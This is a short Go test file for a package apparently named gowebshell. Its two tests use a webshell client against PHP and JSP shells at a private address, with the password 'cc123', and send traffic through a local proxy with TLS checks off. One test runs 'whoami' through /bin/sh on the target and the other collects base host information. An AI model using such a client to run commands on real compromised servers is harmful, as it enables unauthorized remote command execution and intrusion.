package gowebshell

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"net/url"
	"testing"
)

func TestWebshell_ExecCommand(t *testing.T) {
	var webshell,err=NewWebshell("http://172.16.95.24/test.php","cc123","",nil)
	if err!=nil{
		t.Log(err)
	}
	tr := &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
	}
	u, err := url.Parse("http://127.0.0.1:8080")
	if err != nil {
	}
	tr.Proxy = http.ProxyURL(u)
	client:=&http.Client{Transport: tr}
	op:=&Options{client: client}
	cmd,err:=webshell.ExecCommand("/usr","whoami","/bin/sh", PhpScriptCmd,op)
	if err!=nil{
		t.Log(err)
	}
	fmt.Println(cmd.Result)
}

func TestWebshell_GetBaseInfo(t *testing.T) {
	var webshell,err=NewWebshell("http://172.16.95.24:8080/12/2.jsp","cc123","",nil)
	if err!=nil{
		t.Log(err)
	}
	tr := &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
	}
	u, err := url.Parse("http://127.0.0.1:8080")
	if err != nil {
	}
	tr.Proxy = http.ProxyURL(u)
	client:=&http.Client{Transport: tr}
	op:=&Options{client: client}
	info,err:=webshell.GetBaseInfo(JspScriptBaseInfo,op)
	if err!=nil{
		t.Log(err)
	}
	fmt.Println(info)
}